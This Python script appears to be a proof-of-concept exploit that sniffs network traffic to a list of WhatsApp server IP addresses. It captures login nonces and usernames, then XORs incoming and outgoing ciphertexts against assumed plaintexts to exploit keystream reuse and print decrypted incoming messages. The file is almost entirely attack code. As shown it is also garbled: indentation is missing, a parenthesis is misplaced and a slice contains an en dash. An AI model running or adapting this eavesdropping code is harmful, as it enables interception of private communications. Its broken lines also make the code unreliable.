from pcapy import findalldevs, open_live
from impacket import ImpactDecoder, ImpactPacket
import funxmpp
import lxml.etree as etree
import base64
import time
import datetime
ips = ["173.193.247.211",
"184.173.136.73",
"184.173.136.75",
"184.173.136.80",
"184.173.161.179",
"184.173.161.181",
"184.173.161.184",
"184.173.179.34",
"184.173.179.35",
"50.22.231.37",
"50.22.231.40",
"50.22.231.42",
"50.22.231.45",
"50.22.231.48",
"50.22.231.51",
"50.22.231.53",
"50.22.231.56",
"50.22.231.59",
"173.192.219.131",
"173.192.219.140",
"173.193.247.205",
"173.193.247.209"]
username = None
salt = None
date = None
incoming_ciphertexts = []
outgoing_ciphertexts = []
outgoing_plaintexts = []
incoming_plaintexts = []
cipher_start = 0
def zipXor(x, y):
return [a ^ b for (a,b) in zip(x, y)]
def callback(hdr, data):
global username, salt, date, outgoing_ciphertexts, incoming_ciphertexts, outgoing_plaintexts, incoming_plaintexts, cipher_start
decoder = ImpactDecoder.EthDecoder()
ether = decoder.decode(data)
iphdr = ether.child()
tcphdr = iphdr.child()
if not tcphdr.get_SYN() and tcphdr.get_ACK():
src_ip = iphdr.get_ip_src()
dst_ip = iphdr.get_ip_dst()
if not (src_ip in ips or dst_ip in ips):
return
packet = data[ether.get_header_size() + iphdr.get_header_size() + tcphdr.get_header_size():]
if len(packet) == 0:
return
incoming = (src_ip in ips)
if ord(packet[0]) == 0 or packet[0] == 'A':
if ord(packet[0]) == 0:
start = 3
else:
start = 6
while start < len(packet):
(a,b) = funxmpp.decode_with_len(packet[start:])
print("%s %s" % ("IN: " if incoming else "OUT: ", a.replace("\n", "")))
parser = etree.XMLParser(recover=True)
tree = etree.fromstring(a, parser=parser)
if tree.tag == "{urn:ietf:params:xml:ns:xmpp-sasl}auth":
username = tree.attrib["user"]
elif tree.tag == "{urn:ietf:params:xml:ns:xmpp-sasl}challenge":
salt = base64.b64decode(tree.text)
elif tree.tag == "{urn:ietf:params:xml:ns:xmpp-sasl}response":
date = int(time.mktime(datetime.datetime.utcnow().timetuple()))
print("Sniffing a login from %s on %s. Nonce is %s." % (username, date, salt.encode("hex")))
outgoing_ciphertexts += map(ord, base64.b64decode(tree.text)[4:])
outgoing_plaintexts = map(ord, "%s%s%s" % (username, salt, date)
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_1"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_2"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_3"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_4"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_5"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_6"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_7"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_8"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_9"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_10"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_11"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_12"><ping xmlns="w:p"></ping></iq>""")
outgoing_plaintexts += funxmpp.encode("""<iq to="s.whatsapp.net" type="get" id="ping_13"><ping xmlns="w:p"></ping></iq>"""))
start += b + 3
elif packet == "W":
return
else:
if incoming:
incoming_ciphertexts += map(ord, packet[7:])
else:
outgoing_ciphertexts += map(ord, packet[3:–4])
incoming_plain = zipXor(outgoing_plaintexts, zipXor(incoming_ciphertexts, outgoing_ciphertexts))
try:
incoming_plain = "".join(map(chr, incoming_plain))
while cipher_start < len(incoming_plain):
(a,b) = funxmpp.decode_with_len(incoming_plain[cipher_start:])
print("%s %s" % ("IN: ", a.replace("\n", "")))
cipher_start += b
except Exception as e:
return
ifs = findalldevs()
reader = open_live(ifs[0], 1500, 0, 100)
reader.setfilter('ip proto \tcp && port 443')
reader.loop(0, callback) 
